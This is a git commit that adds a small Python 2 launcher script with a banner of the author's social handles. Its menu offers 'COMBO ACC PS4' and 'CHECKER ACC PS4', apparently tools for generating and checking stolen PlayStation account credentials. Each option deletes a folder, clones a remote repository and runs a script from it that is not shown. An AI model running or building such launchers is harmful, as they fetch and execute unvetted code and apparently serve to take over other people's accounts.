551bf83d8ede2df1a81a9d246aabbee6e774bfd3
halohack <79331796+halocrak@users.noreply.github.com>
2022-01-17 18:31:58 +0300

    Add files via upload

---
+++ sql1.py
@@ -0,0 +1,37 @@
+import os
+import sys
+import time
+import requests
+os.system('clear')
+
+
+
+logo = """   \033[5;37;40m
+
+-------------------------------
+      AUTHER: HALO
+       [+] Instagram : i4m_rio
+       [+] Telegram  : i4m_mrx
+       [+] snapchat  : im_halo0
+       [+] github    : halocrak
+       [+] facebook  : imfor halo
+       [+] youtube   : MRX CODAR
+-------------------------------
+"""
+
+print logo
+print '\033[5;30;31m1- COMBO ACC PS4'
+print '2- CHECKER ACC PS4'
+
+im = raw_input('HALLBZHERA:')
+if im == '1':
+    import os
+    os.system("rm -rf all")
+    os.system("git clone https://github.com/halocrak/all")    
+    os.system("python all/ps4.py")
+if im == '2':
+    import os
+    os.system("rm -rf all")
+    os.system("git clone https://github.com/halocrak/all")    
+    os.system("python all/12345.py") 
+    sys.exit()
